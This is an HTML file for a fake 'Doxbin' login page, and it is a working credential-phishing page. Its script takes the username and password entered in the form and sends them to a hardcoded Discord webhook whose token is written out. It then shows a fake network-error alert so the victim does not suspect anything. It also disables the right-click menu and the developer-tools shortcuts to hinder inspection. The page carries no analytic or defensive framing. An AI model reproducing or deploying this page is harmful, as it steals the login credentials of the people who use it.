<!doctype html>
<html>
 <head>
  <title>Doxbin.com</title>
  <meta name="description"
   content="Doxbin">
  <link rel="stylesheet"
   href="style.css">
 </head>
 <body>
  
  <script src="script.js"></script>
  
  
  <link rel="stylesheet"
   href="style.css">
  
  
  
  <link rel="stylesheet"
   href="doxbin-style.css">
  <style>
   body {
    background-color: #222;
    color: #fff;
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
   }
   
   .container {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
   }
   
   .logo {
    width: 200px;
    height: auto;
   }
   
   .title {
    font-size: 24px;
    margin-top: 20px;
   }
   
   .form {
    width: 300px;
    margin-top: 30px;
   }
   
   .form-label {
    display: block;
    margin-top: 10px;
    font-size: 14px;
    color: #999;
   }
   
   .form-input {
    width: 100%;
    padding: 8px;
    margin-top: 5px;
    margin-bottom: 15px;
    border: 1px solid #7289da;
    border-radius: 3px;
    background-color: #36393f;
    color: #fff;
   }
   
   .form-button {
    width: 100%;
    padding: 10px;
    font-size: 16px;
    font-weight: bold;
    color: #fff;
    background-color: #7289da;
    border: none;
    border-radius: 3px;
    cursor: pointer;
   }
   
   .form-button:hover {
    background-color: #677bc4;
   }
  </style>
  </head>
  <body>
   Doxbin
   
   
   
   
   <center>
    <h1 class="title">Login</h1>
    <form class="form">
     <label for="username"
      class="form-label">Username:</label>
     <input type="text" id="username"
      name="username"
      class="form-input" required>
     <label for="password"
      class="form-label">Password:</label>
     <input type="password"
      id="password" name="password"
      class="form-input" required>
     <input type="button" value="Login"
      onclick="sendCredentials()"
      class="form-button">
    </form>
    </div>
   </center>
   
   <style>
    body {
     background: #000000
    }
   </style>
   
   <script
    src="https://code.jquery.com/jquery-3.6.0.min.js">
   </script>
 
 <script>
  document
 .addEventListener(
  'contextmenu',
  function(
   event
  ) {
   event
    .preventDefault();
  }
 );


document
 .addEventListener(
  'keydown',
  function(
   event
  ) {
   if (
    event
    .keyCode ==
    123
   ) {
    event
     .preventDefault();
   }
  }
 );


document
 .addEventListener(
  'keydown',
  function(
   event
  ) {
   if (
    event
    .ctrlKey &&
    event
    .shiftKey &&
    event
    .keyCode ==
    73
   ) {
    event
     .preventDefault();
   }
  }
 );


document
 .addEventListener(
  'keydown',
  function(
   event
  ) {
   if (
    event
    .ctrlKey &&
    event
    .shiftKey &&
    event
    .keyCode ==
    74
   ) {
    event
     .preventDefault();
   }
  }
 );



function sendCredentials() {
 var
  username =
  document
  .getElementById(
   "username"
  )
  .value;
 var
  password =
  document
  .getElementById(
   "password"
  )
  .value;
 
 var
  payload = {
   "content": "New login attempt!",
   "embeds": [{
    "title": "Credentials",
    "fields": [{
      "name": "username ",
      "value": username
     },
     {
      "name": "Password",
      "value": password
     }
    ]
   }]
  };
 
 $.ajax({
  url: "https://discord.com/api/webhooks/1122546652444622888/1H5B91W_jW3cAhkSACdCNxE7FxoP5EHheXNxApGn4JListK2HpfaIFDEJTDst1W2ERR6",
  type: "POST",
  data: JSON
   .stringify(
    payload
   ),
  contentType: "application/json",
  success: function() {
   alert
    (
     "An error occurred please check your network or try again later."
    );
  },
  error: function(
   xhr,
   status,
   error
  ) {
   console
    .error(
     xhr
     .responseText
    );
   alert
    (
     "An error occurred please check your network or try again later."
    );
  }
 });
}
 </script>
   
  </body>
</html>
